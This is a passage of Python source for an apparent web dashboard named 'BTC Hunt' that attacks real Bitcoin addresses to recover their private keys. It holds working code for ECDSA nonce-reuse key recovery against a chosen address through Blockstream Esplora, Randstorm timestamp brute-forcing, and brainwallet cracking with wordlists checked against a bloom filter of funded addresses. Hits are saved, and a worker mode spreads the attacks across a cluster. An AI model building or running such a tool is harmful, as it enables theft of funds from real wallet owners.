            out += put_varint(len(use)) + use + seq
        out += put_varint(n_out)
        for val, script in outs:
            out += val + put_varint(len(script)) + script
        out += locktime + htype.to_bytes(4, 'little')
        return int.from_bytes(sha256d(bytes(out)), 'big')
    except Exception:
        return None

def _fetch_sigs_for_address(addr, log):
    """Fetch all (r,s,z) signatures for an address via Esplora."""
    sigs = []
    try:
        txt = _esplora_get(f"/address/{addr}/txs")
        txs = json.loads(txt)
    except Exception as e:
        log(f"[nonce] address fetch failed: {e}")
        return sigs
    log(f"[nonce] {len(txs)} transactions for {addr}")
    for tx in txs:
        txid = tx.get('txid')
        try:
            raw = bytes.fromhex(_esplora_get(f"/tx/{txid}/hex"))
        except Exception:
            continue
        # try legacy first
        vin = tx.get('vin', [])
        for idx, inp in enumerate(vin):
            script_sig_hex = inp.get('scriptsig', '')
            if not script_sig_hex: continue
            sig_bytes = bytes.fromhex(script_sig_hex)
            # find DER sig inside
            r_pos = sig_bytes.find(b'\x30')
            if r_pos < 0: continue
            parsed = _parse_der_sig(sig_bytes[r_pos:])
            if not parsed: continue
            r, s, htype = parsed
            prevout = inp.get('prevout', {})
            spk = prevout.get('scriptpubkey', '')
            if not spk: continue
            z = _legacy_sighash(raw, idx, bytes.fromhex(spk), htype)
            if z is None: continue
            sigs.append({"txid": txid, "r": r, "s": s, "z": z,
                         "input": idx, "type": "legacy"})
    return sigs

def attack_nonce_reuse(address, log, job):
    """Fetch sigs, group by r, recover key algebraically."""
    log(f"[nonce] target {address}")
    sigs = _fetch_sigs_for_address(address, log)
    if not sigs:
        log("[nonce] no signatures extracted")
        return []
    by_r = defaultdict(list)
    for sg in sigs:
        by_r[sg['r']].append(sg)
    dupes = {r: v for r, v in by_r.items() if len(v) > 1}
    log(f"[nonce] {len(dupes)} reused-r groups")
    hits = []
    for r, group in dupes.items():
        for a in range(len(group)):
            for b in range(a + 1, len(group)):
                s1, z1 = group[a]['s'], group[a]['z']
                s2, z2 = group[b]['s'], group[b]['z']
                den = (s1 - s2) % N
                if den == 0: continue
                try:
                    k = ((z1 - z2) * pow(den, -1, N)) % N
                    d = ((s1 * k - z1) * pow(r, -1, N)) % N
                except Exception:
                    continue
                for label, addr in derive_addresses(d):
                    hit = {"address": address, "privkey": hex(d),
                           "recovered_addr": addr, "type": label,
                           "r": hex(r), "txids": [group[a]['txid'], group[b]['txid']],
                           "found_at": datetime.now(timezone.utc).isoformat()}
                    hits.append(hit); _save_result("nonce", hit)
                    log(f"  ★★★ KEY {hex(d)}  {addr}")
    log(f"[nonce] done — {len(hits)} hits")
    return hits


# ════════════════════════════════════════════════════════════════════
# JOB MANAGER + SQLITE
# ════════════════════════════════════════════════════════════════════
_JOBS = {}
_JOBS_LOCK = threading.Lock()

_HITS_FILE = None  # set in worker mode: append-only JSONL of hits

def _db():
    c = sqlite3.connect(DB_PATH, check_same_thread=False)
    c.executescript("""
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            attack TEXT, payload TEXT, ts TEXT
        );
    """)
    return c

def _save_result(attack, payload):
    with _db() as c:
        c.execute("INSERT INTO results (attack,payload,ts) VALUES (?,?,?)",
                  (attack, json.dumps(payload), datetime.now(timezone.utc).isoformat()))
    if _HITS_FILE is not None:
        _HITS_FILE.write(json.dumps({"attack": attack, **payload}) + "\n")
        _HITS_FILE.flush()

def _list_results():
    with _db() as c:
        return [{"attack": a, "payload": json.loads(p), "ts": t}
                for a, p, t in c.execute(
                    "SELECT attack,payload,ts FROM results ORDER BY id DESC LIMIT 500")]

def _sync_busy():
    """Keep the deploy marker in sync with the set of live jobs."""
    try:
        with _JOBS_LOCK:
            alive = sorted(n for n, j in _JOBS.items() if j["alive"])
        if alive:
            BUSY_FILE.write_text(",".join(alive), encoding="utf-8")
        else:
            BUSY_FILE.unlink(missing_ok=True)
    except OSError:
        pass


def _start_job(name, fn, *args):
    with _JOBS_LOCK:
        if name in _JOBS and _JOBS[name]["alive"]:
            return False, "job already running"
        job = {"progress": 0.0, "detail": "starting…", "alive": True,
               "stop": False, "log": [], "log_total": 0, "error": "",
               "started": datetime.now(timezone.utc).isoformat()}
        _JOBS[name] = job
    _sync_busy()

    def log(msg):
        # The log list is capped, but log_total is monotonic so clients can
        # ask for "everything since N" without losing their place.
        with _JOBS_LOCK:
            job["log"].append(msg)
            job["log_total"] += 1
            if len(job["log"]) > 500:
                del job["log"][:-500]
        print(f"[{name}] {msg}", flush=True)

    def runner():
        try:
            fn(*args, job=job, log=log)
        except Exception as e:
            job["error"] = str(e)
            log(f"[!] {name} crashed: {e}")
        finally:
            job["alive"] = False
            if job["error"]:
                job["detail"] = f"failed: {job['error']}"
            else:
                job["progress"] = 1.0
                job["detail"] = job["detail"] or "done"
            _sync_busy()

    threading.Thread(target=runner, daemon=True).start()
    return True, "started"


# ════════════════════════════════════════════════════════════════════
# FLASK APP
# ════════════════════════════════════════════════════════════════════
app = Flask(__name__)

# Optional HTTP Basic auth. This dashboard exposes unauthenticated POST
# endpoints and a public URL on Render; set both env vars (the Blueprint
# prompts for them) to require a login. Leave them blank for the original
# open behaviour. /health stays public so Render's health check works.
APP_USER     = os.environ.get("APP_USER", "").strip()
APP_PASSWORD = os.environ.get("APP_PASSWORD", "")

def _auth_challenge():
    return Response("Authentication required", 401,
                    {"WWW-Authenticate": 'Basic realm="BTC Hunt"'})

@app.before_request
def _require_auth():
    if not (APP_USER and APP_PASSWORD) or request.path == "/health":
        return None
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Basic "):
        return _auth_challenge()
    try:
        user, pw = base64.b64decode(auth[6:], validate=True).decode("utf-8").split(":", 1)
    except Exception:
        return _auth_challenge()
    if not (hmac.compare_digest(user, APP_USER) and
            hmac.compare_digest(pw, APP_PASSWORD)):
        return _auth_challenge()
    return None

@app.route("/health")
def health():
    # Liveness only: no disk, dataset or database dependency.
    return {"status": "ok"}

PAGE = """
<!doctype html><html><head><meta charset="utf-8">
<title>BTC Hunt</title><style>
*{box-sizing:border-box;margin:0}body{background:#0b0f14;color:#d8dee9;
font-family:ui-monospace,Menlo,monospace;padding:20px;max-width:1100px;margin:auto}
h1{color:#88c0d0;border-bottom:2px solid #3b4252;padding-bottom:8px;margin-bottom:16px}
h2{color:#81a1c1;margin:16px 0 8px}
a{color:#88c0d0;text-decoration:none;margin-right:12px}
a:hover{color:#8fbcbb}
.card{background:#1e242c;border:1px solid #3b4252;border-radius:6px;padding:14px;
margin:10px 0}
.btn{background:#5e81ac;color:#eceff4;border:none;padding:8px 16px;
border-radius:4px;cursor:pointer;font-family:inherit;font-size:14px}
.btn:hover{background:#81a1c1}.btn.danger{background:#bf616a}
input,textarea{background:#2e3440;color:#d8dee9;border:1px solid #4c566a;
padding:8px;border-radius:4px;width:100%;font-family:inherit;margin:4px 0}
label{color:#88c0d0;font-size:13px;display:block;margin-top:6px}
pre{background:#0b0f14;padding:10px;border-radius:4px;overflow:auto;
max-height:320px;font-size:12px;border:1px solid #3b4252}
.bar{background:#2e3440;border-radius:4px;height:12px;overflow:hidden;margin:6px 0}
.bar>div{background:#a3be8c;height:100%;transition:width .3s}
.hit{color:#ebcb8b;font-weight:bold}
.muted{color:#7b8794;font-size:13px}
.status-ok{color:#a3be8c}.status-bad{color:#bf616a}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:12px}
.msg{padding:10px;border-radius:4px;margin:10px 0;font-size:13px}
.msg:empty{display:none}
.msg.ok{background:#2e3b2b;color:#a3be8c;border:1px solid #a3be8c}
.msg.err{background:#3b2629;color:#bf616a;border:1px solid #bf616a}
</style>
<script>
// Short JSON polls instead of long-lived SSE streams. SSE generators used to
// loop forever and exhaust Gunicorn's worker threads, which made the whole
// dashboard appear frozen after a few tabs were opened.
function notify(text, ok){
  const m=document.getElementById('msg');
  if(!m)return;
  m.textContent=text||'';
  m.className='msg '+(text?(ok?'ok':'err'):'');
}
function post(url, body){
  const init={method:'POST',cache:'no-store',headers:{'Content-Type':'application/json'}};
  if(body!==undefined) init.body=JSON.stringify(body);
  return fetch(url,init)
    .then(r=>{
      if(!r.ok) throw new Error('HTTP '+r.status+
        (r.status===401?' (login expired — reload this page)':''));
      return r.json();
    })
    .then(d=>{ notify(d.msg||(d.ok?'started':'failed'), !!d.ok); return d; })
    .catch(e=>{ notify('Request failed: '+e.message,false); return {ok:false,msg:e.message}; });
}
function stop(name){ post('/api/stop/'+encodeURIComponent(name), {}); }
function watch(name){
  let since=0, lines=[], delay=1000;
  const NL=String.fromCharCode(10);
  const bar=document.getElementById('bar'),
        detail=document.getElementById('detail'),
        log=document.getElementById('log');
  function tick(){
    fetch('/api/job/'+encodeURIComponent(name)+'?since='+since,{cache:'no-store'})
      .then(r=>{ if(!r.ok) throw new Error('HTTP '+r.status); return r.json(); })
      .then(d=>{
        since=d.log_len||0;
        if(d.log && d.log.length){
          lines=lines.concat(d.log);
          if(lines.length>300) lines=lines.slice(-300);
          if(log){ log.textContent=lines.join(NL); log.scrollTop=log.scrollHeight; }
        }
        if(bar) bar.style.width=(Math.min(1,Math.max(0,d.progress||0))*100).toFixed(1)+'%';
        if(detail){
          detail.textContent=d.error ? 'ERROR: '+d.error :
                             (d.detail || (d.alive?'running…':'not started'));
          detail.className=d.error?'status-bad':'muted';
        }
        delay=(d.alive||d.exists)?1000:3000;
      })
      .catch(e=>{ if(detail) detail.textContent='status unavailable: '+e.message; delay=3000; })
      .finally(()=>setTimeout(tick,delay));
  }
  tick();
}
</script>
</head><body>
<h1>₿ BTC Hunt — pre-2015 attack dashboard</h1>
<p><a href="/">home</a><a href="/data">dataset</a>
<a href="/randstorm">randstorm</a><a href="/brain">brainwallet</a>
<a href="/nonce">nonce reuse</a><a href="/results">results</a></p>
<hr style="border-color:#3b4252;margin:14px 0">
<div id="msg" class="msg"></div>
{body}
</body></html>
"""

def page(body):
    return PAGE.replace("{body}", body)

@app.route("/")
def home():
    dataset = BLOOM_PATH.exists()
    body = f"""
<div class="card">
<h2>Dataset</h2>
<p>{'<span class="status-ok">✓ bloom filter ready</span>' if dataset else
'<span class="status-bad">✗ no bloom — visit /data first</span>'}</p>
</div>
<div class="grid">
<div class="card"><h2>1. Randstorm</h2>
<p class="muted">BitcoinJS-lib v0.1.3 (2011–2015) used Math.random()
instead of crypto.getRandomValues. Iterating millisecond timestamps
reproduces the private key.</p>
<a class="btn" href="/randstorm">Open</a></div>
<div class="card"><h2>2. Brainwallet</h2>
<p class="muted">SHA256(passphrase) → private key. Human passphrases
have ~40 bits of entropy. 130k pw/s against a bloom filter finds the
weak ones.</p>
<a class="btn" href="/brain">Open</a></div>
<div class="card"><h2>3. Nonce Reuse</h2>
<p class="muted">Two ECDSA signatures sharing r ⇒ recover k and d
algebraically. Fetches signatures via Blockstream Esplora.</p>
<a class="btn" href="/nonce">Open</a></div>
</div>"""
    return page(body)

@app.route("/data")
def data_page():
    status = {
        "bloom": BLOOM_PATH.exists(),
        "gz": ADDR_GZ.exists(),
        "bloom_size": BLOOM_PATH.stat().st_size if BLOOM_PATH.exists() else 0,
        "gz_size": ADDR_GZ.stat().st_size if ADDR_GZ.exists() else 0,
    }
    body = f"""
<div class="card"><h2>Dataset status</h2>
<p>cached dataset (.gz): {'✓ ' + f'{status["gz_size"]/1e9:.2f} GB' if status['gz']
else '✗ not downloaded'}</p>
<p>funded.bloom: {'✓ ' + f'{status["bloom_size"]/1e6:.0f} MB' if status['bloom']
else '✗ not built'}</p>
<label>Dataset URL (optional — tried first, before the built-in mirrors)</label>
<input id="u" placeholder="https://example.com/bitcoin.hex.gz">
<button class="btn" onclick="startDataset(false)">Download &amp; build bloom</button>
<button class="btn" onclick="startDataset(true)">Re-download &amp; rebuild</button>
<button class="btn danger" onclick="stop('dataset')">Stop</button>
<p class="muted">Tries LoyceV's dated snapshots first (its LATEST direct
download was disabled in 2026), then other public mirrors. A .hex.gz hash160
dump (~470 MB) is preferred over a .tsv.gz address dump (~1.6 GB). Budget:
{BUILD_DEADLINE_SECS // 60} min total, {DOWNLOAD_DEADLINE_SECS // 60} min for
the download. You can also copy a .gz to {DATA_DIR}/blockchair.tsv.gz and
click Download — the cached file is used without re-downloading. Progress and
the live log are below.</p>
</div>
<div class="card"><h2>Progress</h2>
<div class="bar"><div id="bar" style="width:0%"></div></div>
<p id="detail" class="muted">not started</p><pre id="log"></pre>
</div>
<script>
function startDataset(force){{
  const u=document.getElementById('u').value.trim();
  const d={{force:force}};
  if(u) d.url=u;
  post('/api/dataset',d);
}}
watch('dataset');
</script>"""
    return page(body)

@app.route("/api/dataset", methods=["POST"])
def api_dataset():
    j = request.get_json(silent=True)
    if not isinstance(j, dict):
        j = {}
    force = bool(j.get("force"))
    raw_url = j.get("url")
    custom = raw_url.strip() if isinstance(raw_url, str) else ""
    if custom and not re.match(r"^https?://", custom, re.I):
        return {"ok": False, "msg": "dataset URL must start with http:// or https://"}
    with _JOBS_LOCK:
        busy = "dataset" in _JOBS and _JOBS["dataset"]["alive"]
    if busy:
        return {"ok": False, "msg": "a dataset job is already running"}
    if force:
        ADDR_GZ.unlink(missing_ok=True)
        Path(str(ADDR_GZ) + ".part").unlink(missing_ok=True)
    # None => use the default list plus automatic LoyceV dated-snapshot
    # discovery. A custom URL is tried first, with the defaults as fallbacks.
    sources = [custom] + DATASET_URLS if custom else None

    def runner(job, log):
        def progress(frac, detail):
            job["progress"] = max(0.0, min(1.0, frac))
            job["detail"] = detail
        try:
            build_bloom(log, progress, lambda: job["stop"], sources)
            job["progress"] = 1.0
            job["detail"] = "done — bloom filter ready"
            log("[✓] dataset ready")
        except Exception as e:
            if str(e) == "cancelled":
                job["detail"] = "stopped by user"
                log("[!] cancelled by user")
            else:
                job["error"] = str(e)
                log(f"[!] {e}")
    ok, msg = _start_job("dataset", runner)
    return {"ok": ok, "msg": msg}

@app.route("/randstorm")
def rs_page():
    body = """
<div class="card"><h2>Randstorm — timestamp range</h2>
<label>Start (ms since epoch)</label>
<input id="s" value="1293840000000">
<label>End (ms since epoch)</label>
<input id="e" value="1293840001000">
<p class="muted">2011-01-01 → 2015-01-01 is the vulnerable window, but that is
126 billion timestamps and would take months. The default here is a 1,000 ms
smoke test; raise it in small chunks (max 5,000,000 ms per run).</p>
<button class="btn" onclick="start()">Start</button>
<button class="btn danger" onclick="stop('randstorm')">Stop</button>
</div>
<div class="card"><h2>Progress</h2>
<div class="bar"><div id="bar" style="width:0%"></div></div>
<p id="detail" class="muted"></p><pre id="log"></pre>
</div>
<script>
function start(){
  const s=parseInt(document.getElementById('s').value,10),
        e=parseInt(document.getElementById('e').value,10);
  post('/api/randstorm',{start:s,end:e});
}
watch('randstorm');
</script>"""
    return page(body)

@app.route("/api/randstorm", methods=["POST"])
def api_rs():
    if not BLOOM_PATH.exists():
        return {"ok": False,
                "msg": "bloom not built — build it on the /data page first"}
    j = request.get_json(silent=True) or {}
    try:
        start, end = int(j["start"]), int(j["end"])
    except (KeyError, TypeError, ValueError):
        return {"ok": False, "msg": "start and end must be integer ms timestamps"}
    if end < start:
        return {"ok": False, "msg": "end must be >= start"}
    if end - start + 1 > 5_000_000:
        return {"ok": False,
                "msg": "range too large (max 5,000,000 ms per run) — split it up"}
    try:
        bf = BloomFilter.load(BLOOM_PATH)
    except Exception as e:
        return {"ok": False, "msg": f"cannot load bloom filter: {e}"}
    ok, msg = _start_job("randstorm", attack_randstorm, start, end, bf)
    return {"ok": ok, "msg": msg}

@app.route("/brain")
def brain_page():
    body = """
<div class="card"><h2>Brainwallet — passphrase file</h2>
<label>Upload .txt (one passphrase per line)</label>
<input type="file" id="f" accept=".txt">
<button class="btn" onclick="start()">Start</button>
<button class="btn danger" onclick="stop('brainwallet')">Stop</button>
<p class="muted">Try rockyou.txt, common English phrases, or
custom lists. Max ~130k pw/s against bloom.</p>
</div>
<div class="card"><h2>Progress</h2>
<div class="bar"><div id="bar" style="width:0%"></div></div>
<p id="detail" class="muted"></p><pre id="log"></pre>
</div>
<script>
function start(){
  const file=document.getElementById('f').files[0];
  if(!file){alert('pick a file');return}
  const reader=new FileReader();
  reader.onload=()=>{
    post('/api/brain',{data:reader.result});
  };
  reader.readAsText(file);
}
watch('brainwallet');
</script>"""
    return page(body)

@app.route("/api/brain", methods=["POST"])
def api_brain():
    if not BLOOM_PATH.exists():
        return {"ok": False,
                "msg": "bloom not built — build it on the /data page first"}
    j = request.get_json(silent=True) or {}
    lines = [ln.strip() for ln in (j.get("data") or "").splitlines() if ln.strip()]
    if not lines:
        return {"ok": False, "msg": "no passphrases (pick a .txt file first)"}
    try:
        bf = BloomFilter.load(BLOOM_PATH)
    except Exception as e:
        return {"ok": False, "msg": f"cannot load bloom filter: {e}"}
    ok, msg = _start_job("brainwallet", attack_brainwallet, lines, bf)
    return {"ok": ok, "msg": msg}

@app.route("/nonce")
def nonce_page():
    body = """
<div class="card"><h2>Nonce reuse — target address</h2>
<label>Bitcoin address</label>
<input id="a" placeholder="1... or bc1...">
<button class="btn" onclick="start()">Scan</button>
<button class="btn danger" onclick="stop('nonce')">Stop</button>
<p class="muted">Fetches all txs via Blockstream Esplora, finds
repeated r values, recovers the private key.</p>
</div>
<div class="card"><h2>Progress</h2>
<p id="detail" class="muted"></p><pre id="log"></pre>
</div>
<script>
function start(){
  const a=document.getElementById('a').value.trim();
  post('/api/nonce',{address:a});
}
watch('nonce');
</script>"""
    return page(body)

@app.route("/api/nonce", methods=["POST"])
def api_nonce():
    j = request.get_json(silent=True) or {}
    addr = (j.get("address") or "").strip()
    if not addr: return {"ok": False, "msg": "enter a Bitcoin address first"}
    if not re.fullmatch(r"[1-9A-HJ-NP-Za-km-z]{2,90}", addr):
        return {"ok": False, "msg": "that does not look like a Bitcoin address"}
    ok, msg = _start_job("nonce", attack_nonce_reuse, addr)
    return {"ok": ok, "msg": msg}

@app.route("/results")
def results_page():
    rows = _list_results()
    body = "<div class='card'><h2>Results</h2>"
    if not rows:
        body += "<p class='muted'>no hits yet</p>"
    for r in rows:
        # Hit payloads can contain user-supplied passphrases: escape before
        # inserting into HTML, otherwise a stored XSS is possible.
        body += (f"<div class='card'><p class='hit'>[{html.escape(str(r['attack']))}] "
                 f"{html.escape(str(r['ts']))}</p>"
                 f"<pre>{html.escape(json.dumps(r['payload'], indent=2))}</pre></div>")
    body += "</div>"
    return page(body)

@app.route("/api/job/<name>")
def api_job_status(name):
    """Short, cache-free JSON snapshot. Clients poll with ?since=<log_total>.

    Replaces the old text/event-stream generator, which never terminated when
    idle and therefore held one Gunicorn thread open per browser tab forever.
    """
    with _JOBS_LOCK:
        job = _JOBS.get(name)
        if job is None:
            payload = {"exists": False, "alive": False, "progress": 0.0,
                       "detail": "not started", "error": "", "log": [],
                       "log_len": 0}
        else:
            total = job["log_total"]
            try:
                since = int(request.args.get("since", 0) or 0)
            except ValueError:
                since = 0
            since = max(0, min(since, total))
            n_new = min(total - since, len(job["log"]))
            new = job["log"][-n_new:] if n_new > 0 else []
            payload = {"exists": True, "alive": job["alive"],
                       "progress": job["progress"], "detail": job["detail"],
                       "error": job["error"], "log": new, "log_len": total,
                       "started": job["started"]}
    return Response(json.dumps(payload), mimetype="application/json",
                    headers={"Cache-Control": "no-store, max-age=0"})


@app.route("/api/log/<name>")
def api_log_status(name):
    return api_job_status(name)


@app.route("/api/stop/<name>", methods=["POST"])
def api_stop(name):
    with _JOBS_LOCK:
        job = _JOBS.get(name)
        if not job or not job["alive"]:
            return {"ok": False, "msg": "no running job"}
        job["stop"] = True
        job["detail"] = "stopping…"
    return {"ok": True, "msg": "stop requested"}


# ════════════════════════════════════════════════════════════════════
# ENTRY
# ════════════════════════════════════════════════════════════════════
def _shard_range(start, end, idx, n):
    """Split [start,end] into n contiguous shards; return shard idx (0-based)."""
    total = end - start + 1
    per = total // n
    s = start + idx * per
    e = end if idx == n - 1 else s + per - 1
    return s, e


if __name__ == "__main__":
    ap = argparse.ArgumentParser(
        epilog="worker mode (for cluster nodes): "
               "python btc_hunt.py --worker randstorm --shard 3/10   "
               "# timestamps split across 10 nodes\n"
               "python btc_hunt.py --worker brainwallet --shard 3/10 --wordlist words.txt")
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--build-bloom", action="store_true")
    ap.add_argument("--cli-randstorm", nargs=2, type=int, metavar=("START","END"))
    ap.add_argument("--worker", choices=["randstorm", "brainwallet"],
                    help="run a single shard of an attack and exit (cluster worker mode)")
    ap.add_argument("--shard", metavar="IDX/N", help="0-based shard index / total shards, e.g. 3/10")
    ap.add_argument("--wordlist", help="passphrase file for --worker brainwallet")
    args = ap.parse_args()

    if args.build_bloom:
        build_bloom(print); sys.exit(0)

    if args.cli_randstorm:
        if not BLOOM_PATH.exists():
            sys.exit("run --build-bloom first")
        bf = BloomFilter.load(BLOOM_PATH)
        attack_randstorm(args.cli_randstorm[0], args.cli_randstorm[1],
                         bf, print, {"stop": False, "progress": 0, "detail": ""})
        sys.exit(0)

    if args.worker:
        if not args.shard or "/" not in args.shard:
            sys.exit("--worker requires --shard IDX/N (e.g. --shard 3/10)")
        try:
            idx, n = (int(x) for x in args.shard.split("/", 1))
        except ValueError:
            sys.exit("--shard must look like IDX/N (e.g. 3/10)")
        if not (0 <= idx < n) or n < 1:
            sys.exit(f"shard index {idx} out of range for {n} shards")
        if not BLOOM_PATH.exists():
            sys.exit("bloom not found — run --build-bloom first "
                     "(or point DISK_PATH at the node's data dir)")
        bf = BloomFilter.load(BLOOM_PATH)
        hits_path = DATA_DIR / f"hits_shard{idx}_of_{n}.jsonl"
        _HITS_FILE = open(hits_path, "a", encoding="utf-8")
        job = {"stop": False, "progress": 0, "detail": ""}
        if args.worker == "randstorm":
            s, e = _shard_range(GENESIS_TS, CUTOFF_TS, idx, n)
            print(f"[worker] randstorm shard {idx+1}/{n}: {s}..{e}", flush=True)
            attack_randstorm(s, e, bf, print, job)
        else:
            if not args.wordlist:
                sys.exit("--worker brainwallet requires --wordlist FILE")
            with open(args.wordlist, encoding="utf-8", errors="ignore") as f:
                pws = [l.rstrip("\n") for l in f if l.strip()]
            shard = pws[idx::n]
            print(f"[worker] brainwallet shard {idx+1}/{n}: "
                  f"{len(shard):,}/{len(pws):,} passphrases", flush=True)
            attack_brainwallet(shard, bf, print, job)
        _HITS_FILE.close()
        print(f"[worker] done — hits appended to {hits_path}", flush=True)
        sys.exit(0)

    app.run(host="0.0.0.0", port=args.port, debug=False)
